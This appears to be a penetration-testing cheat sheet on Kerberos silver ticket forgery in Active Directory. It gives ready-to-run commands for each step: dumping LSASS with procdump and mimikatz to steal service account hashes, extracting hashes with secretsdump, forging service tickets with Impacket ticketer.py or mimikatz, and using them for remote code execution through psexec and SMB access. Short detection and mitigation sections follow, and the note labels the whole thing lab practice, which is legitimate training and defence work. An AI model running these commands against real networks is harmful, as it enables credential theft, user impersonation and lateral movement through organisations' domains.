## Short summary (one line)

A **silver ticket** is a forged Kerberos **service (TGS)** ticket for a specific SPN, signed with a **service account key** (NT hash or AES key). If you have that hash/key, you can mint a ticket that the service will accept without contacting the DC.

---

## What you need (prereqs)

- **Service account key material** (NTLM hash for RC4, or AES key for AES).
    
    - Typical lab sources: LSASS dump (mimikatz / procdump), NTDS export, Kerberoast-cracked password reused for service account.
        
- **Target SPN** (format `service/host` like `cifs/host.domain.local` or `http/web.domain.local`).
    
- **Domain FQDN** and **domain SID** (tools often require the domain SID).
    
- A session/context to present the forged ticket (local Windows shell where you can inject/use a ticket, or export a ccache and use Impacket tools with `-k`).
    

---

## Decision: which tool to use

- **Impacket `ticketer.py`** — from Kali/Linux: create silver ticket & ccache for Impacket tools.
    
- **Mimikatz (kerberos::golden / /ptt)** — on Windows: craft and inject silver ticket into session immediately.
    
- Use **ticketer** if on Linux/Kali and prefer Impacket flows; use **mimikatz** if you’re on a Windows host.
    

---

## Common parameter notes

- `-spn` or `/service`: the SPN you target (e.g., `cifs/target.domain.local`, `http/web.domain.local`, `mssqlsvc/db.domain.local:1433`).
    
- `-nthash` / `/rc4`: NTLM hash (32 hex chars) for RC4 encryption.
    
- `-aesKey` or `/aes256`/`/aes128`: hex AES key if the service uses AES keys.
    
- `domain-sid`: domain SID like `S-1-5-21-XXXXXXXXXX-XXXXXXXXX-XXXXXXXXX` (get from `whoami /user` and strip RID).
    

---

## LAB COMMANDS — concise (replace placeholders)

### 0) Get domain SID (Windows shell)

```
whoami /user
# Output S-1-5-21-XXXX-XXXX-XXXX-<RID>; strip the final -<RID> to get domain SID.
```

### 1) Obtain service account NT hash (lab only)

- **Option A: dump LSASS with ProcDump + Mimikatz (Windows)**
    

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# transfer lsass.dmp to Kali or run mimikatz minidump locally:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

- **Option B: Impacket secretsdump (with creds)**
    

```
impacket-secretsdump DOMAIN/Administrator:Pass@dc.domain.local -just-dc-ntlm
```

---

### 2) Create a silver ticket with Impacket ticketer.py (Linux/Kali)

```
python3 /usr/share/doc/impacket/examples/ticketer.py \
  -nthash <NTLM_HEX_HASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  -spn cifs/target.domain.local \
  victim_user

# Output: victim_user.ccache (or stdout)
export KRB5CCNAME=/path/to/victim_user.ccache
impacket-psexec domain/victim_user@target.domain.local -k -no-pass
```

Notes: use `-aesKey` if the service uses AES keys instead of RC4.

---

### 3) Forge & inject with Mimikatz (on Windows)

```
mimikatz.exe
# within mimikatz prompt:
privilege::debug
# Forge a silver ticket (CIFS example):
kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXX /user:SomeUser \
  /rc4:<NTLM_HASH_OF_SERVICE_ACCOUNT> /service:cifs /target:target.domain.local /ptt
```

Notes:

- `/user` = the username to impersonate in the ticket.
    
- `/rc4` uses the service account NTLM hash. Use `/aes256` or `/aes128` for AES keys.
    
- `/ptt` = pass-the-ticket: inject ticket into current session.
    

---

### 4) Use forged ticket with Impacket tools (example)

```
export KRB5CCNAME=/path/to/victim_user.ccache
impacket-psexec DOMAIN/victim_user@target.domain.local -k -no-pass
# or access SMB directly with Kerberos:
smbclient -k //target.domain.local/C$
```

---

## Lab scenario (what to practice)

1. Build: DC + member host with service account and SPN (`cifs/host.lab.local`) and a known password.
    
2. Obtain service account hash via controlled LSASS dump or set known password.
    
3. Use `ticketer.py` to create silver ticket (ccache) and test with `impacket-psexec -k` or `smbclient -k`.
    
4. Repeat with `mimikatz kerberos::golden ... /ptt` on Windows host.
    
5. Observe DC logs and service logs; document detection indicators.
    

---

## Detection & indicators

- **Service-side access without corresponding DC TGS issuance** (no Event 4769 on DC for that ticket). Correlate service logs vs DC logs.
    
- **Anomalous service account usage** from unusual IPs/times.
    
- **Endpoint telemetry** showing ticket injection into LSASS or suspicious mimikatz activity.
    
- **Ticket/PAC anomalies**: unusual flags, lifetimes, or malformed PACs.
    

---

## Mitigations

- Use **gMSA** for service accounts where possible.
    
- Rotate and harden service account passwords; avoid reuse.
    
- Disable weak crypto (RC4) and require AES where supported; note AES keys still usable if leaked.
    
- Monitor and correlate DC/service logs for TGS/service mismatches.
    
- Reduce exposure of service account credentials and restrict read access to hosts/backups.
    

---

## Pitfalls / gotchas

- Wrong domain SID — ticketer needs the exact domain SID.
    
- Using NT hash when service uses AES — supply AES key instead.
    
- SPN exact format matters (use FQDN hostnames, not IPs).
    
- Some services may PAC-validate or reject forged tickets; fallback to other vectors.
    

---

## Memorize checklist

1. Find SPN & service account.
    
2. Get service account hash/key.
    
3. Get domain SID.
    
4. Forge ticket (ticketer.py or mimikatz) with correct hash/key and SPN.
    
5. Use ticket to access service; verify and document.
    

---

**References & study**: Impacket examples, mimikatz docs, ADSecurity detection writeups. (Use only in lab.)